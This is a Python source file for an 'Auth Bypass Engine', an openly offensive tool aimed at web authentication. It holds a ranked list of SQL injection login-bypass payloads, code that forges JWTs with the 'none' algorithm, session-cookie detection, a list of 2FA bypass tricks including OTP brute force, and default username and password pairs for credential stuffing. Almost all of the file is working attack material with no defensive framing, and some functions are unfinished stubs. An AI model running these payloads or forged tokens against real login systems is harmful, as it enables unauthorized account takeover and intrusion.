"""
Auth Bypass Engine - Authentication bypass via SQLi with AI-driven analysis
Covers login bypass, session hijacking, JWT manipulation, 2FA bypass
"""

import base64
import hashlib
import json
import re
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass


@dataclass
class BypassResult:
    technique: str
    payload: str
    success: bool
    confidence: float
    evidence: str
    risk: str


class AuthBypassEngine:
    def __init__(self):
        self.login_bypasses = self._init_login_bypasses()
        self.session_patterns = self._init_session_patterns()
        self.jwt_patterns = self._init_jwt_patterns()

    def _init_login_bypasses(self) -> List[Dict]:
        """Comprehensive login bypass payloads"""
        return [
            # Classic SQLi
            {"payload": "' OR '1'='1", "type": "classic_or"},
            {"payload": "' OR 1=1-- -", "type": "comment_or"},
            {"payload": "' OR 1=1#", "type": "hash_or"},
            {"payload": "' OR '1'='1'-- -", "type": "string_or"},
            {"payload": "' OR '1'='1'#", "type": "string_hash"},
            {"payload": "\" OR 1=1-- -", "type": "double_quote"},
            {"payload": "admin'-- -", "type": "comment_user"},
            {"payload": "admin'#", "type": "hash_user"},
            {"payload": "admin' OR '1'='1", "type": "admin_or"},
            {"payload": "admin' OR 1=1-- -", "type": "admin_comment"},

            # Admin enumeration
            {"payload": "admin'--", "type": "admin_comment2"},
            {"payload": "admin'/*", "type": "admin_block_comment"},
            {"payload": "' UNION SELECT 1,'admin','password'-- -", "type": "union_inject"},
            {"payload": "admin' AND 1=1-- -", "type": "admin_and_true"},

            # Type juggling (PHP/MySQL)
            {"payload": "admin' AND 1=0 UNION SELECT * FROM users WHERE '1'='1", "type": "union_bypass"},

            # Null/empty bypass
            {"payload": "'='", "type": "always_true"},
            {"payload": "'=''", "type": "empty_string"},
            {"payload": "admin'='", "type": "admin_equals"},

            # Unicode/normalization bypass
            {"payload": "administrator'-- -", "type": "full_admin"},
            {"payload": "ADMIN' OR '1'='1", "type": "uppercase_admin"},

            # Comment-based
            {"payload": "admin'/**/OR/**/'1'='1", "type": "commented_or"},
            {"payload": "admin'/*!OR*/'1'='1", "type": "versioned_or"},

            # Multi-byte character bypass
            {"payload": "%bf' OR 1=1-- -", "type": "multibyte"},
            {"payload": "%bf%27 OR 1=1-- -", "type": "multibyte_encoded"},

            # Backslash escape
            {"payload": "\\' OR 1=1-- -", "type": "backslash"},

            # Parenthesis bypass
            {"payload": "admin') OR ('1'='1", "type": "paren_or"},
            {"payload": "admin')) OR (('1'='1", "type": "double_paren"},

            # Encoded bypasses
            {"payload": "'||'1'=='1", "type": "js_or"},
            {"payload": "'||1==1", "type": "js_operator"},

            # Blind time-based detection
            {"payload": "' OR IF(1=1,SLEEP(0),0)-- -", "type": "time_check"},
        ]

    def _init_session_patterns(self) -> Dict[str, str]:
        return {
            "PHP": r"PHPSESSID=[a-zA-Z0-9]+",
            "Java": r"JSESSIONID=[a-zA-Z0-9]+",
            "ASP.NET": r"ASP\.NET_SessionId=[a-zA-Z0-9]+",
            "Node.js": r"connect\.sid=[a-zA-Z0-9%]+",
            "Ruby": r"_session_id=[a-zA-Z0-9]+",
            "Python": r"session=[a-zA-Z0-9]+",
            "JWT": r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+",
        }

    def _init_jwt_patterns(self) -> Dict:
        return {
            "none_alg": {"header": {"alg": "none", "typ": "JWT"}, "risk": "CRITICAL"},
            "weak_secret": {"header": {"alg": "HS256", "typ": "JWT"}, "risk": "HIGH"},
            "alg_confusion": {"header": {"alg": "HS256"}, "risk": "HIGH"},
        }

    def generate_login_bypass(self, username: str = "admin",
                              password: str = "password") -> List[BypassResult]:
        """Generate login bypass payloads for all techniques"""
        results = []

        for bypass in self.login_bypasses:
            payload = bypass["payload"]
            # Customize with username if needed
            if "admin" in payload and username:
                payload = payload.replace("admin", username)

            results.append(BypassResult(
                technique=f"Login Bypass ({bypass['type']})",
                payload=payload,
                success=False,
                confidence=self._rate_bypass_chance(bypass["type"]),
                evidence="",
                risk="HIGH"
            ))

        # Sort by confidence
        results.sort(key=lambda r: r.confidence, reverse=True)
        return results

    def _rate_bypass_chance(self, bypass_type: str) -> float:
        """Rate the likelihood of bypass success"""
        ratings = {
            "classic_or": 0.95, "comment_or": 0.9, "hash_or": 0.85,
            "string_or": 0.8, "string_hash": 0.8, "double_quote": 0.75,
            "comment_user": 0.7, "admin_or": 0.9, "union_inject": 0.6,
            "always_true": 0.5, "multibyte": 0.4, "backslash": 0.3,
            "paren_or": 0.85, "double_paren": 0.75, "js_or": 0.6,
            "time_check": 0.3,
        }
        return ratings.get(bypass_type, 0.3)

    def detect_session_type(self, cookies: Dict[str, str]) -> Dict:
        """Detect session type from cookies"""
        for name, value in (cookies or {}).items():
            for session_type, pattern in self.session_patterns.items():
                if re.match(pattern, f"{name}={value}"):
                    return {"type": session_type, "name": name, "value": value}
        return {"type": "Unknown", "name": "", "value": ""}

    def jwt_attack(self, token: str) -> List[BypassResult]:
        """JWT attack techniques"""
        results = []

        # Parse JWT
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return results

            header_b64 = parts[0]
            # Add padding
            padding = 4 - len(header_b64) % 4
            if padding != 4:
                header_b64 += "=" * padding

            header = json.loads(base64.b64decode(header_b64))

            # None algorithm attack
            if header.get("alg") != "none":
                new_header = base64.b64encode(
                    json.dumps({"alg": "none", "typ": "JWT"}).encode()
                ).decode().rstrip("=")
                new_token = f"{new_header}.{parts[1]}.{parts[2]}"
                results.append(BypassResult(
                    technique="JWT None Algorithm",
                    payload=new_token,
                    success=False,
                    confidence=0.7,
                    evidence="Changed alg to 'none'",
                    risk="CRITICAL"
                ))

            # Algorithm confusion (RS256 → HS256)
            if header.get("alg") == "RS256":
                new_header = base64.b64encode(
                    json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
                ).decode().rstrip("=")
                # Use public key as HMAC secret (known attack)
                results.append(BypassResult(
                    technique="JWT Alg Confusion (RS→HS)",
                    payload="",
                    success=False,
                    confidence=0.6,
                    evidence="Algorithm changed from RS256 to HS256",
                    risk="CRITICAL"
                ))

        except Exception as e:
            pass

        return results

    def detect_session_fixation(self, url: str, cookies: Dict[str, str]) -> BypassResult:
        """Check for session fixation vulnerabilities"""
        session = self.detect_session_type(cookies)
        if session["type"] and session.get("value"):
            # Check if session ID looks predictable
            value = session["value"]
            if len(value) < 10 or value.isdigit():
                return BypassResult(
                    technique="Session Fixation",
                    payload=value,
                    success=False,
                    confidence=0.5,
                    evidence=f"Weak session ID: {value}",
                    risk="HIGH"
                )

        return BypassResult(
            technique="Session Fixation",
            payload="", success=False, confidence=0,
            evidence="No session detected", risk="NONE"
        )

    def generate_2fa_bypass(self) -> List[BypassResult]:
        """2FA bypass techniques"""
        return [
            BypassResult(technique="Parameter Manipulation",
                         payload="otp=000000",
                         success=False, confidence=0.1,
                         evidence="Try default OTP values", risk="HIGH"),
            BypassResult(technique="Response Manipulation",
                         payload="true",
                         success=False, confidence=0.2,
                         evidence="Modify 2FA response", risk="HIGH"),
            BypassResult(technique="Backup Code",
                         payload="backup_code=",
                         success=False, confidence=0.3,
                         evidence="Try backup code bypass", risk="HIGH"),
            BypassResult(technique="Session Reuse",
                         payload="",
                         success=False, confidence=0.25,
                         evidence="Reuse pre-2FA session", risk="HIGH"),
            BypassResult(technique="OTP Bruteforce",
                         payload="603176",
                         success=False, confidence=0.05,
                         evidence="Bruteforce 6-digit OTP", risk="MEDIUM"),
        ]

    def test_credential_stuffing(self, usernames: List[str],
                                  passwords: List[str]) -> List[Tuple[str, str, float]]:
        """Generate credential stuffing combinations"""
        common = [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("admin", "admin123"), ("root", "root"), ("test", "test"),
            ("user", "password"), ("admin", "passw0rd"),
        ]
        return [(u, p, 0.01) for u, p in common]
